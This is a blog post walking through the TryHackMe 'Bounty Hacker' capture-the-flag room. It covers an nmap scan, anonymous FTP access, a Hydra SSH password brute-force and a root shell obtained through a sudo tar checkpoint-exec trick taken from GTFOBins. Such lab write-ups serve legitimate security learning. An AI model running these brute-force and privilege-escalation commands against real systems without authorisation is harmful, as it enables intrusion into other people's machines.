---
layout: blog
title: TryHackMe Bounty Hacker Writeup
publishDate: 2023-12-03T12:09:00.000Z
description: Step-by-step walkthrough of TryhackMe Bounty Hacker room. This is
  an easy room, great for learning about Nmap, FTP, Hydra and privilege
  escalation.
tags:
  - tryhackme
  - writeup
---
I ran a simple TCP SYN scan using Nmap to find all the open ports. 

```sh
nmap -sS -vv TARGET_IP
```

![](/images/uploads/screenshot-2025-03-22-120746.png)

3 ports were found open:

| Port | Service |
| ---- | ------- |
| 21   | ftp     |
| 22   | ssh     |
| 80   | http    |

As the FTP service was running on an open port, I tried connecting to the FTP server using the username "anonymous" and it worked.

```sh
ftp TARGET_IP
```

I listed all the files in the current directory using the `ls` command.

![](/images/uploads/screenshot-2025-03-22-120832.png)

I downloaded both the files using the `get` command

```sh
get task.txt

get locks.txt
```

The task.txt file contained the name name of the user who wrote the task list.

![](/images/uploads/screenshot-2025-03-22-120704.png)

The locks.txt file was a wordlist, probably containing the password of the user, which I cracked using Hydra by trying to login to the SSH server, which was also running on an open port.

```sh
hydra -l USERNAME -P locks.txt ssh://TARGET_IP
```

![](/images/uploads/screenshot-2025-03-22-120716.png)

Now I could login to the target machine remotely using ssh with this username and password.

```sh
ssh USER@TARGET_IP
```

The user.txt file was found in the `~/Desktop` directory.

The user did not have root access. So, I ran `sudo -l` to find sudo permissions. The user had `/bin/tar` permission.

![](/images/uploads/screenshot-2025-03-22-120723.png)

This allowed me to escalate privileges to root and gain access to a root shell. I used this command to do so.

```sh
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Source: [tar | GTFOBins](https://gtfobins.github.io/gtfobins/tar/#sudo)

![](/images/uploads/screenshot-2025-03-22-120731.png)

The root.txt could be found in `/root` directory.
